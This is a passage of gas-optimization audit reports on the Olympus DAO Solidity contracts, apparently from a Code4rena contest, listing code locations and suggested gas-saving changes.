src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)     ```solidity    205        /// Cache config in memory    206        Config memory config_ = _config;    ...    384            /// Cache config struct to avoid multiple SLOADs    385            Config memory config_ = _config;    ...    439            /// Cache config struct to avoid multiple SLOADs    440            Config memory config_ = _config;    ...    666        Regen memory regen = _status.low;    ```  3. **Using `private` rather than `public` for constants, saves gas (8 instances)**     If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table     Deployment Gas Saved: **45 857**    Method Call Gas Saved: **308**     - src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)     ```solidity    119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).    120    /// @dev    This is set to 1% of the total supply.    121    uint256 public constant SUBMISSION_REQUIREMENT = 100;    122    123    /// @notice Amount of time a submitted proposal has to activate before it expires.    124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;    125    126    /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.    127    uint256 public constant GRACE_PERIOD = 1 weeks;    128    129    /// @notice Endorsements required to activate a proposal as percentage of total supply.    130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;    131    132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.    133    uint256 public constant EXECUTION_THRESHOLD = 33;    134    135    /// @notice Required time for a proposal to be active before it can be executed.    136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.    137    uint256 public constant EXECUTION_TIMELOCK = 3 days;    ```     - src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)     ```solidity    89     uint32 public constant FACTOR_SCALE = 1e4;    ```     - src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)     ```solidity    65     uint256 public constant FACTOR_SCALE = 1e4;    ```  4. **Use elementary types or a user-defined `type` instead of a `struct` that has only one member. (1 instances)**     Deployment Gas Saved: **30 714**    Method Call Gas Saved: **1 037**     - src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)     ```solidity    33     struct Line {    34         uint256 price; // Price for the specified level    35     }    ```  5. **State variables should be cached in stack variables rather than re-reading them from storage**     Deployment Gas Saved: **24 021**    Method Call Gas Saved: **614**     SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.     - src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)     ```solidity    112        rewardToken.safeTransfer(to_, reward);    113        emit RewardIssued(to_, reward);    ```     fix:     ```solidity            uint256 reward = reward;            rewardToken.safeTransfer(to_, reward);            emit RewardIssued(to_, reward);    ```     - src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)     ```solidity    68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();    70    71         requests = new Permissions[](4);    72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);    74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     fix(similar for other policies):     ```solidity        OlympusTreasury ltrsry = TRSRY;        OlympusMinter lmintr = MINTR;        Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();        Keycode MINTR_KEYCODE = lmintr.KEYCODE();         requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);        requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);        requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);        requests[3] = Permissions(MINTR_KEYCODE, lmintr.burnOhm.selector);    ```     - src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)     ```solidity    77         requests = new Permissions[](2);    78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);    79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);    ```     - src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)     ```solidity    172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();    173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();    175    176        requests = new Permissions[](9);    177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);    178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);    179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);    180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);    181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);    182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);    183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     - src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)     ```solidity    32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);    33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);    34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);    ```     - src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)     ```solidity    35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    36    37        requests = new Permissions[](2);    38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);    ```     - src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)     ```solidity    33        permissions = new Permissions[](2);    34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);    35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);    ```  6. **Using bools for storage incurs overhead (6 instances)**     Deployment Gas Saved: **23 611**    Method Call Gas Saved: **4 485**     ```    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot's contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler's defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    ```     Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past     **Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case     - src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)     ```solidity    181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754    ...    194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:−3016 M:2298    ...    197    mapping(Role => bool) public isRole; //@note D:2407    ```     - src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),     ```solidity    105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007    ...    117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007    ```     - src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)     ```solidity    62     bool public initialized; //@note D:11813    ```     **Expensive method calls**:     It's just to show which bool is better left in the code     - src/policies/Operator.sol     ```solidity    63     bool public initialized; //@note D:5808 M:-22036    ...    66     bool public active; //@note D:-32775 M:-48896    ```     - src/policies/Heart.sol     ```solidity    33     bool public active; //@note D:-382    ```     - src/policies/BondCallback.sol     ```solidity    24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192    ```     - src/Kernel.sol     ```solidity    113    bool public isActive; //@note D:20923 M:-247184    ```  7. **State variables can be packed into fewer storage slots (3 instances)**     If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper     **NOTE**: one slot = 32 bytes     Deployment Gas Saved: **23 292**    Method Call Gas Saved: **1 711**     - src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)     uint256(32), address(20), bool(1)     ```solidity    32     /// @notice Status of the Heart, false = stopped, true = beating    33     bool public active; // @note put below _operator    34    35     /// @notice Timestamp of the last beat (UTC, in seconds)    36     uint256 public lastBeat;    37    38     /// @notice Reward for beating the Heart (in reward token decimals)    39     uint256 public reward;    40    41     /// @notice Reward token address that users are sent for beating the Heart    42     ERC20 public rewardToken;    43    44     // Modules    45     OlympusPrice internal PRICE;    46    47     // Policies    48     IOperator internal _operator;    ```     fix:     ```solidity    uint256 public lastBeat;    uint256 public reward;    ERC20 public rewardToken;    OlympusPrice internal PRICE;    IOperator internal _operator;    bool public active;    ```     - src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)     **NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter     uint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)     ```solidity    inherit Kernel public kernel;    ...    31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.    32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;    33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;    34    35     /// @dev Moving average data    36     uint256 internal _movingAverage; /// See getMovingAverage()    37    38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.    39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.    40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.    41     uint256[] public observations;    42    43     /// @notice Index of the next observation to make. The current value at this index is the oldest observation.    44     uint32 public nextObsIndex;    45    46     /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.    47     uint32 public numObservations;    48    49     /// @notice Frequency (in seconds) that observations should be stored.    50     uint48 public observationFrequency;    51    52     /// @notice Duration (in seconds) over which the moving average is calculated.    53     uint48 public movingAverageDuration;    54    55     /// @notice Unix timestamp of last observation (in seconds).    56     uint48 public lastObservationTime;    57    58     /// @notice Number of decimals in the price values provided by the contract.    59     uint8 public constant decimals = 18;    60    61     /// @notice Whether the price module is initialized (and therefore active).    62     bool public initialized;    63    64     // Scale factor for converting prices, calculated from decimal values.    65     uint256 internal immutable _scaleFactor;    ```     fix:     ```solidity    uint48 public observationFrequency;    uint48 public movingAverageDuration;    AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;    AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;    uint256 internal _movingAverage; /// See getMovingAverage()    uint256[] public observations;    uint32 public nextObsIndex;    uint32 public numObservations;    uint48 public lastObservationTime;    uint8 public constant decimals = 18;    bool public initialized;    uint256 internal immutable _scaleFactor;    ```     - src/policies/Operator.sol:[58-89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89)     uint32(4), uint8(1), address(20), bool(1)     ```solidity    58     /// Operator variables, defined in the interface on the external getter functions    59     Status internal _status;    60     Config internal _config;    61    62     /// @notice    Whether the Operator has been initialized    63     bool public initialized;    64    65     /// @notice    Whether the Operator is active    66     bool public active;    67    68     /// Modules    69     OlympusPrice internal PRICE;    70     OlympusRange internal RANGE;    71     OlympusTreasury internal TRSRY;    72     OlympusMinter internal MINTR;    73    74     /// External contracts    75     /// @notice     Auctioneer contract used for cushion bond market deployments    76     IBondAuctioneer public auctioneer;    77     /// @notice     Callback contract used for cushion bond market payouts    78     IBondCallback public callback;    79    80     /// Tokens    81     /// @notice     OHM token contract    82     ERC20 public immutable ohm;    83     uint8 public immutable ohmDecimals;    84     /// @notice     Reserve token contract    85     ERC20 public immutable reserve;    86     uint8 public immutable reserveDecimals;    87    88     /// Constants    89     uint32 public constant FACTOR_SCALE = 1e4;    ```     fix:     ```solidity    Status internal _status;    Config internal _config;    OlympusPrice internal PRICE;    OlympusRange internal RANGE;    OlympusTreasury internal TRSRY;    OlympusMinter internal MINTR;    IBondAuctioneer public auctioneer;    IBondCallback public callback;    bool public initialized;    bool public active;    ERC20 public immutable ohm;    uint8 public immutable ohmDecimals;    ERC20 public immutable reserve;    uint8 public immutable reserveDecimals;    uint32 public constant FACTOR_SCALE = 1e4;    ```  8. **Expressions that cannot be overflowed can be unchecked (5 instances)**     Deployment Gas Saved: **23 016**     - src/Kernel.sol:[299-300](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300), [309-310](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310)     ```solidity    299        activePolicies.push(policy_);    300        getPolicyIndex[policy_] = activePolicies.length - 1; // @note cannot be overflowed due to a previous push    ...    309            moduleDependents[keycode].push(policy_);    310            getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1; // @note cannot be overflowed due to a previous push    ```     - src/modules/PRICE.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89), [144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [171](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171)     ```solidity    89         uint256 exponent = decimals + reserveEthDecimals - ohmEthDecimals; //@note overflow is not possible, if an underflow occurs, the next statement will revert    ...    144        nextObsIndex = (nextObsIndex + 1) % numObs; //@note numObs can not be equal 0 during to check in constructor    ...    171            if (updatedAt < block.timestamp - uint256(observationFrequency)) // @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165    ```  9. **Increment optimization (18 instances)**     For a uint256 i variable, the following is true with the Optimizer enabled at 10k:     Increment:     i += 1 is the most expensive form    i++ costs 6 gas less than i += 1    ++i costs 5 gas less than i++ (11 gas less than i += 1)    Decrement:     i -= 1 is the most expensive form    i-- costs 11 gas less than i -= 1    --i costs 5 gas less than i-- (16 gas less than i -= 1)     1. **Prefix increments are cheaper than postfix increments, especially when it's used in for-loops (3 instances).**     Deployment Gas Saved: **400**     - src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)     ```solidity    49            i++;    ...    64            i++;    ```     - src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488)     NOTE: in case of 670 675 686 691 not applicable and gas will be lost     ```solidity    488            decimals++;    ```     2. **`<x> = <x> + 1` even more efficient than pre increment.(18 instances)**     Deployment Gas Saved: **14 217**     - src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)     ```solidity    49            i++;    ...    64            i++;    ```     - src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488), [670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670), [675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675), [686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686), [691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691)    -     ```solidity    488            decimals++;    ...    670                _status.low.count++;    ...    675                _status.low.count--;    ...    686                _status.high.count++;    ...    691                _status.high.count--;    ```     - src/Kernel.sol:[313](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313), [357](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357), [369](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369), [386](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386), [404](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404), [429](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429)     ```solidity    313                ++i;    ...    357                ++i;    ...    369                ++j;    ...    386                ++i;    ...    404                ++i;    ...    429                ++i;    ```     - src/modules/INSTR.sol:[72](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72)     ```solidity    72                ++i;    ```     - src/modules/PRICE.sol:[225](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225)     ```solidity    225                ++i;    ```     - src/policies/BondCallback.sol:[163](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163)     ```solidity    163                ++i;    ```     - src/policies/Governance.sol:[281](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281)     ```solidity    281                ++step;    ```     - src/policies/TreasuryCustodian.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62)     ```solidity    62                ++j;    ```  10. **Use named `returns` for local variables where it is possible (3 instances)**      Deployment Gas Saved: **5 400**      - src/Kernel.sol:[130-135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135)      ```solidity     130    /// @notice Function to grab module address from a given keycode.     131    function getModuleAddress(Keycode keycode_) internal view returns (address) {     132        address moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));     133        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);     134        return moduleForKeycode;     135    }     ```      fix:      ```solidity      function getModuleAddress(Keycode keycode_) internal view returns (address moduleForKeycode) {          moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));          if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);      }     ```      - src/modules/INSTR.sol:[41-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79)      ```solidity     41    /// @notice Store a list of Instructions to be executed in the future.     42    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {     43        uint256 length = instructions_.length;     44        uint256 instructionsId = ++totalInstructions;     45     46        Instruction[] storage instructions = storedInstructions[instructionsId];     ...     76        emit InstructionsStored(instructionsId);     77     78        return instructionsId;     79    }     ```      - src/modules/PRICE.sol:[153-180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180)      ```solidity     153    /// @notice Get the current price of OHM in the Reserve asset from the price feeds     154    function getCurrentPrice() public view returns (uint256) {     ...     177        uint256 currentPrice = (ohmEthPrice * _scaleFactor) / reserveEthPrice;     178     179        return currentPrice;     180    }     ```  11. **`x = x + y` is cheaper than `x += y;` (6 instances)**      Deployment Gas Saved: **5 000**      Usually does not work with struct and mappings      - src/modules/PRICE.sol:[136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136), [138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138), [222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222)      ```solidity     136            _movingAverage += (currentPrice - earliestPrice) / numObs;     ...     138            _movingAverage -= (earliestPrice - currentPrice) / numObs;     ...     222            total += startObservations_[i];     ```      - src/modules/VOTES.sol:[56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56), [58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58)      ```solidity     56        balanceOf[from_] -= amount_;     ...     58            balanceOf[to_] += amount_;     ```      - src/policies/Heart.sol:[103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)      ```solidity     103        lastBeat += frequency();     ```  12. **Deleting a struct is cheaper than creating a new struct with null values. (1 instances)**      Deployment Gas Saved: **4 207**     Method Call Gas Saved: **40**      - src/policies/Governance.sol:[288](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288)      ```solidity     288        activeProposal = ActivatedProposal(0, 0);     ```      fix:      ```solidity      delete activeProposal;     ```  13. **Don't compare boolean expressions to boolean literals (2 instances)**      Deployment Gas Saved: **1 607**      - src/policies/Governance.sol:[223](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223), [306](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306)      ```solidity     223        if (proposalHasBeenActivated[proposalId_] == true) {     ...     306        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {     ```  14. **`revert` operator should be in the code as early as reasonably possible (3 instances)**      Deployment Gas Saved: **200**     Method Call Gas Saved: **1 559+**      - src/modules/INSTR.sol:[43-48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48)      ```solidity     43        uint256 length = instructions_.length;     44        uint256 instructionsId = ++totalInstructions;     45     46        Instruction[] storage instructions = storedInstructions[instructionsId];     47     48        if (length == 0) revert INSTR_InstructionsCannotBeEmpty(); // @note after 43     ```      - src/policies/Governance.sol:[180-191](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191), [241-249](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249)      ```solidity     180    function endorseProposal(uint256 proposalId_) external {     181        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert     182     183        if (proposalId_ == 0) {     184            revert CannotEndorseNullProposal();     185        }     186     187        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     188        if (instructions.length == 0) {     189            revert CannotEndorseInvalidProposal();     190        }     191     ```      ```solidity     241        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert     242     243        if (activeProposal.proposalId == 0) {     244            revert NoActiveProposalDetected();     245        }     246     247        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {     248            revert UserAlreadyVoted();     249        }     ```  15. **Duplicated require()/revert() checks should be refactored to a modifier or function**      Method Call Gas Saved: **8 111**      - [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)      ```solidity     if (!initialized) revert Price_NotInitialized(); // @note 4 instances     ``` 
## gas optimization ### G01: COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS #### problem 0 is less gas efficient than !0 if you enable the optimizer at 10k AND you’re in a require statement. Detailed explanation with the opcodes https://twitter.com/gzeon/status/1485428085885640706 #### prof policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\r'  ### G02: PREFIX INCREMENT SAVE MORE GAS #### problem prefix increment ++i is more cheaper than postfix i++ #### prof policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r'   ### G03: X += Y COSTS MORE GAS THAN X = X + Y FOR STATE VARIABLES #### prof policies/BondCallback.sol, 143, b'        _amountsPerMarket[id_][0] += inputAmount_;\r' policies/BondCallback.sol, 144, b'        _amountsPerMarket[id_][1] += outputAmount_;\r' policies/Governance.sol, 194, b'        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\r' policies/Governance.sol, 198, b'        totalEndorsementsForProposal[proposalId_] += userVotes;\r' policies/Governance.sol, 254, b'            noVotesForProposal[activeProposal.proposalId] += userVotes;\r' policies/Governance.sol, 252, b'            yesVotesForProposal[activeProposal.proposalId] += userVotes;\r' policies/Heart.sol, 103, b'        lastBeat += frequency();\r' modules/PRICE.sol, 138, b'            _movingAverage -= (earliestPrice - currentPrice) / numObs;' modules/PRICE.sol, 136, b'            _movingAverage += (currentPrice - earliestPrice) / numObs;' modules/TRSRY.sol, 96, b'        reserveDebt[token_][msg.sender] += amount_;\r' modules/TRSRY.sol, 97, b'        totalDebt[token_] += amount_;\r' modules/TRSRY.sol, 115, b'        reserveDebt[token_][msg.sender] -= received;\r' modules/TRSRY.sol, 116, b'        totalDebt[token_] -= received;\r' modules/TRSRY.sol, 132, b'        else totalDebt[token_] -= oldDebt - amount_;\r' modules/TRSRY.sol, 131, b'        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;\r'  ### G04: USING BOOLS FOR STORAGE INCURS OVERHEAD #### problem // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled. #### prof policies/Governance.sol, 105, b'    mapping(uint256 => bool) public proposalHasBeenActivated;\r' policies/Governance.sol, 117, b'    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;\r' Kernel.sol, 181, b'    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;\r' Kernel.sol, 194, b'    mapping(address => mapping(Role => bool)) public hasRole;\r' Kernel.sol, 197, b'    mapping(Role => bool) public isRole;\r'  ### G05: resign the default value to the variables. #### problem  resign the default value to the variables will cost more gas. #### prof Kernel.sol, 397, b'        